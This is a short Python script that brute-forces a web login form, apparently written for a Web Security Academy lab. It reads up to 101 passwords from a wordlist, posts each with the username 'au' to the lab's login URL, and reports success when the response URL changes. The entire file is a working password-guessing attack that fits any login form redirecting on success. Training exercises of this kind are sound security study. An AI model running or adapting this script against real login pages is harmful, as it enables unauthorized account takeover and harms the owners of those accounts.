import requests


def main():
    url = "https://ac5b1f2f1ed4c711c0513cf700950002.web-security-academy.net/login"

    passwords = open('passwords.txt', 'r')

    for i in range(101):
        password = passwords.readline().strip()

        data_user = {'username': 'au', 'password': password}

        print("Trying with {}".format(password))
        r = requests.post(url, data = data_user)


        if (r.url != url):
            print("Password is: {}".format(password))
            break

if __name__ == "__main__":
    main()